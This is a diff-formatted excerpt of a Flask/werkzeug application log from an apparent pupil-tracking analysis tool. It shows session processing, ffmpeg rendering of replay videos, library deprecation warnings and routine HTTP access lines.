+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/5f5df207-198a-436b-bb42-5e3f8c823419/figures/859_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/5f5df207-198a-436b-bb42-5e3f8c823419/figures/859_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/5f5df207-198a-436b-bb42-5e3f8c823419/figures/860_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/5f5df207-198a-436b-bb42-5e3f8c823419/figures/860_replay.mp4']
+/home/ubuntu/reactrack/analysis.py:380: RuntimeWarning: Mean of empty slice
+  pupil = pupil - np.nanmean(pupil[stim_idx - 5: stim_idx])
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/5f5df207-198a-436b-bb42-5e3f8c823419/figures/861_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/5f5df207-198a-436b-bb42-5e3f8c823419/figures/861_replay.mp4']
+INFO:root:Processing: 6d806992-6b56-481a-a1ad-167922843102
+Processing: 6d806992-6b56-481a-a1ad-167922843102
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6d806992-6b56-481a-a1ad-167922843102/figures/863_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6d806992-6b56-481a-a1ad-167922843102/figures/863_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6d806992-6b56-481a-a1ad-167922843102/figures/864_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6d806992-6b56-481a-a1ad-167922843102/figures/864_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6d806992-6b56-481a-a1ad-167922843102/figures/865_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6d806992-6b56-481a-a1ad-167922843102/figures/865_replay.mp4']
+INFO:root:Processing: 7aa144d5-2f86-4642-a146-d417e303f755
+Processing: 7aa144d5-2f86-4642-a146-d417e303f755
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/7aa144d5-2f86-4642-a146-d417e303f755/figures/867_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/7aa144d5-2f86-4642-a146-d417e303f755/figures/867_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/7aa144d5-2f86-4642-a146-d417e303f755/figures/868_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/7aa144d5-2f86-4642-a146-d417e303f755/figures/868_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/7aa144d5-2f86-4642-a146-d417e303f755/figures/869_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/7aa144d5-2f86-4642-a146-d417e303f755/figures/869_replay.mp4']
+INFO:root:Processing: 48ff53fa-ea51-4e05-bf3e-abd0c9c14704
+Processing: 48ff53fa-ea51-4e05-bf3e-abd0c9c14704
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/48ff53fa-ea51-4e05-bf3e-abd0c9c14704/figures/871_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/48ff53fa-ea51-4e05-bf3e-abd0c9c14704/figures/871_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/48ff53fa-ea51-4e05-bf3e-abd0c9c14704/figures/872_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/48ff53fa-ea51-4e05-bf3e-abd0c9c14704/figures/872_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/48ff53fa-ea51-4e05-bf3e-abd0c9c14704/figures/873_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/48ff53fa-ea51-4e05-bf3e-abd0c9c14704/figures/873_replay.mp4']
+INFO:root:Processing: 62fd7ea7-57a5-444e-a6fd-6f8a64a1a87c
+Processing: 62fd7ea7-57a5-444e-a6fd-6f8a64a1a87c
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/62fd7ea7-57a5-444e-a6fd-6f8a64a1a87c/figures/875_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/62fd7ea7-57a5-444e-a6fd-6f8a64a1a87c/figures/875_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/62fd7ea7-57a5-444e-a6fd-6f8a64a1a87c/figures/876_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/62fd7ea7-57a5-444e-a6fd-6f8a64a1a87c/figures/876_replay.mp4']
+INFO:root:Currently processing: 62fd7ea7-57a5-444e-a6fd-6f8a64a1a87c<br>353 left to go
+Currently processing: 62fd7ea7-57a5-444e-a6fd-6f8a64a1a87c<br>353 left to go
+INFO:werkzeug:201.244.239.157 - - [03/Feb/2020 03:35:46] "GET /process HTTP/1.1" 200 -
+201.244.239.157 - - [03/Feb/2020 03:35:46] "GET /process HTTP/1.1" 200 -
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/62fd7ea7-57a5-444e-a6fd-6f8a64a1a87c/figures/877_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/62fd7ea7-57a5-444e-a6fd-6f8a64a1a87c/figures/877_replay.mp4']
+INFO:root:Currently processing: 62fd7ea7-57a5-444e-a6fd-6f8a64a1a87c<br>353 left to go
+Currently processing: 62fd7ea7-57a5-444e-a6fd-6f8a64a1a87c<br>353 left to go
+INFO:werkzeug:201.244.239.157 - - [03/Feb/2020 03:37:41] "GET /process HTTP/1.1" 200 -
+201.244.239.157 - - [03/Feb/2020 03:37:41] "GET /process HTTP/1.1" 200 -
+INFO:root:Currently processing: 62fd7ea7-57a5-444e-a6fd-6f8a64a1a87c<br>353 left to go
+Currently processing: 62fd7ea7-57a5-444e-a6fd-6f8a64a1a87c<br>353 left to go
+INFO:werkzeug:201.244.239.157 - - [03/Feb/2020 03:37:47] "GET /process HTTP/1.1" 200 -
+201.244.239.157 - - [03/Feb/2020 03:37:47] "GET /process HTTP/1.1" 200 -
+INFO:root:Currently processing: 62fd7ea7-57a5-444e-a6fd-6f8a64a1a87c<br>353 left to go
+Currently processing: 62fd7ea7-57a5-444e-a6fd-6f8a64a1a87c<br>353 left to go
+INFO:werkzeug:201.244.239.157 - - [03/Feb/2020 03:37:48] "GET /process HTTP/1.1" 200 -
+201.244.239.157 - - [03/Feb/2020 03:37:48] "GET /process HTTP/1.1" 200 -
+INFO:root:Processing: 74aa28dd-862b-4477-8aae-54008a775982
+Processing: 74aa28dd-862b-4477-8aae-54008a775982
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/74aa28dd-862b-4477-8aae-54008a775982/figures/879_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/74aa28dd-862b-4477-8aae-54008a775982/figures/879_replay.mp4']
+INFO:root:Currently processing: 74aa28dd-862b-4477-8aae-54008a775982<br>352 left to go
+Currently processing: 74aa28dd-862b-4477-8aae-54008a775982<br>352 left to go
+INFO:werkzeug:201.244.239.157 - - [03/Feb/2020 03:40:04] "GET /process HTTP/1.1" 200 -
+201.244.239.157 - - [03/Feb/2020 03:40:04] "GET /process HTTP/1.1" 200 -
+INFO:root:Currently processing: 74aa28dd-862b-4477-8aae-54008a775982<br>352 left to go
+Currently processing: 74aa28dd-862b-4477-8aae-54008a775982<br>352 left to go
+INFO:werkzeug:201.244.239.157 - - [03/Feb/2020 03:40:38] "GET /process HTTP/1.1" 200 -
+201.244.239.157 - - [03/Feb/2020 03:40:38] "GET /process HTTP/1.1" 200 -
+INFO:werkzeug:201.244.239.157 - - [03/Feb/2020 03:40:39] "GET /favicon.ico HTTP/1.1" 404 -
+201.244.239.157 - - [03/Feb/2020 03:40:39] "GET /favicon.ico HTTP/1.1" 404 -
+INFO:root:Currently processing: 74aa28dd-862b-4477-8aae-54008a775982<br>352 left to go
+Currently processing: 74aa28dd-862b-4477-8aae-54008a775982<br>352 left to go
+INFO:werkzeug:201.244.239.157 - - [03/Feb/2020 03:40:40] "GET /process HTTP/1.1" 200 -
+201.244.239.157 - - [03/Feb/2020 03:40:40] "GET /process HTTP/1.1" 200 -
+INFO:root:Currently processing: 74aa28dd-862b-4477-8aae-54008a775982<br>352 left to go
+Currently processing: 74aa28dd-862b-4477-8aae-54008a775982<br>352 left to go
+INFO:werkzeug:201.244.239.157 - - [03/Feb/2020 03:42:27] "GET /process HTTP/1.1" 200 -
+201.244.239.157 - - [03/Feb/2020 03:42:27] "GET /process HTTP/1.1" 200 -
+INFO:root:Currently processing: 74aa28dd-862b-4477-8aae-54008a775982<br>352 left to go
+Currently processing: 74aa28dd-862b-4477-8aae-54008a775982<br>352 left to go
+INFO:werkzeug:201.244.239.157 - - [03/Feb/2020 03:42:29] "GET /process HTTP/1.1" 200 -
+201.244.239.157 - - [03/Feb/2020 03:42:29] "GET /process HTTP/1.1" 200 -
+INFO:root:Currently processing: 74aa28dd-862b-4477-8aae-54008a775982<br>352 left to go
+Currently processing: 74aa28dd-862b-4477-8aae-54008a775982<br>352 left to go
+INFO:werkzeug:201.244.239.157 - - [03/Feb/2020 03:42:32] "GET /process HTTP/1.1" 200 -
+201.244.239.157 - - [03/Feb/2020 03:42:32] "GET /process HTTP/1.1" 200 -
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/74aa28dd-862b-4477-8aae-54008a775982/figures/880_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/74aa28dd-862b-4477-8aae-54008a775982/figures/880_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/74aa28dd-862b-4477-8aae-54008a775982/figures/881_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/74aa28dd-862b-4477-8aae-54008a775982/figures/881_replay.mp4']
+INFO:werkzeug:164.68.112.178 - - [03/Feb/2020 03:47:58] "GET / HTTP/1.0" 404 -
+164.68.112.178 - - [03/Feb/2020 03:47:58] "GET / HTTP/1.0" 404 -
+INFO:root:Processing: 571ec841-900d-4cbc-9adc-f02b5cb9d93d
+Processing: 571ec841-900d-4cbc-9adc-f02b5cb9d93d
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/571ec841-900d-4cbc-9adc-f02b5cb9d93d/figures/883_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/571ec841-900d-4cbc-9adc-f02b5cb9d93d/figures/883_replay.mp4']
+INFO:root:Currently processing: 571ec841-900d-4cbc-9adc-f02b5cb9d93d<br>351 left to go
+Currently processing: 571ec841-900d-4cbc-9adc-f02b5cb9d93d<br>351 left to go
+INFO:werkzeug:201.244.239.157 - - [03/Feb/2020 03:53:15] "GET /process HTTP/1.1" 200 -
+201.244.239.157 - - [03/Feb/2020 03:53:15] "GET /process HTTP/1.1" 200 -
